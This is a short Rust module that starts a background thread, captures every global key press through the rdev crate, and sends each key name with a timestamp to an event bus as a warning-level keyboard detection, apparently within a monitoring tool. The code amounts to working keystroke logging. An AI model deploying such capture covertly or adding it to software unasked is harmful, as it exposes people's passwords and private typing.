use std::sync::atomic::Ordering;
use std::thread;
use std::time::{SystemTime, UNIX_EPOCH};
use rdev::{listen, EventType, Key};
use crate::bus::event_bus::send_event;
use crate::bus::events::log_event::LogEvent;
use crate::RUNNING;
use crate::utils::detections::Detections;
use crate::utils::severities::Severities;

pub fn run() {
    thread::spawn(|| {
        if let Err(err) = listen(|mut event| {
            if RUNNING.load(Ordering::Relaxed) {
                match event.event_type {
                    EventType::KeyPress(key) => {
                        match key {
                            Key::Space => event.name = Some(String::from("[SPACE]")),
                            Key::Backspace => event.name = Some(String::from("[BACK-SPACE]")),
                            Key::Return => event.name = Some(String::from("[ENTER]")),
                            Key::Tab => event.name = Some(String::from("[TAB]")),
                            Key::Escape => event.name = Some(String::from("[ESCAPE]")),
                            _ => {}
                        }
                    }
                    _ => {}
                }

                if let Some(name) = event.name {
                    let now = SystemTime::now().duration_since(UNIX_EPOCH).expect("Time went backwards");
                    send_event(Box::new(LogEvent::new(name, Detections::Keyboard, Severities::Warning, now)));
                }
            }
        }) {
            eprintln!("Error: {:?}", err);
        }
    });
}
